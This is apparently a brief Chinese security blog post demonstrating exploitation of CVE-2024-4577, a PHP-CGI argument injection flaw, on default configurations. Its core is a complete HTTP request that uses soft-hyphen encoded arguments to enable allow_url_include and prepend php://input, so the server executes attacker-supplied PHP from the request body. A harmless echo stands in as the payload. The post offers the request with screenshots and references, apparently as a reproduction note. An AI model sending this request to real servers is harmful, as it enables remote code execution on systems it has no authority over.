#  PHP-CGI-Argument-Injection 默认配置打法[CVE-2024-4577]   
原创 L0ne1y  安全之道   2024-06-08 10:10  
  
**复现图**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/vtGbWxD3tLbgOABLjuJ3PrQL12jicoTRulS0MkS27TgSM16LW6TiadibKdpr4CGVPwSbvG93WOzytjvR6BkSBI4aw/640?wx_fmt=jpeg&from=appmsg "")  
  
既然MSF Commit公开了打默认配置的方法也就没啥好藏的了，好像有好几个开源项目已经公开了。  
```
GET /php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: 127.0.0.1

<?php 
echo "L0ne1y";
?>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/vtGbWxD3tLbgOABLjuJ3PrQL12jicoTRud3cx7XmYclEMYqILcWhshL40BG0gJ1YO1o09R5B1z4ubukvOS68Xeg/640?wx_fmt=jpeg&from=appmsg "")  
  
  
  
**参考**  
  
代码审计星球P神文章(不愧是P神=>PHP的神)  
  
https://serverfault.com/questions/925615/how-to-secure-servers-from-a-cgi-bin-php-post-request-attack  
  
